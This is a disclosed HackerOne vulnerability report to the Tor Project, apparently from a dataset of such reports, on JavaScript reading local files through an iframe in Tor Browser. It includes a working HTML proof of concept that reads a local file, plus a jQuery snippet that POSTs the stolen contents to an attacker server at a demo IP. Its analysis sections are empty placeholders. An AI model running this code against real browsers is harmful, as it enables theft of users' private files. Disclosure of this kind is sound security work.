---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '258630'
original_report_id: '258630'
title: Access to local file system using javascript
weakness: Violation of Secure Design Principles
team_handle: torproject
created_at: '2017-08-10T14:59:01.413Z'
disclosed_at: '2017-11-18T09:28:06.412Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- violation-of-secure-design-principles
---

# Access to local file system using javascript

## Metadata

- HackerOne Report ID: 258630
- Weakness: Violation of Secure Design Principles
- Program: torproject
- Disclosed At: 2017-11-18T09:28:06.412Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Issue :

Access to local file system using javascript(slightly xss on server side )

The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.


Steps to Reproduce :


save a html file from here and open in tor browser .

<html>
<body>
<div id='div1'>
</div>
<script>
current_href = document.location.href
frame = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
alert('Your data is: ' + loot)
}, 500)
</script>
</body>
</html>



Explaination :  file:///home/jnsjns/Desktop/poc5.html  this is my test html here.

                file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser 

the private file is coming by popup (I have tested in chrome -Google ,they are safe from this )


What attacker can do ?


I would have been able to post it to my server using jquery like this.

//Gets data from iframe and saves it to the getdata variable
getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
//Posts to the php server located at 192.168.0.102 (local address for demo purposes)
$.ajax({type: "POST", url: "http://192.168.0.102/post.php", data: {string:getdata}});}


This issue may critical .


Regards.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
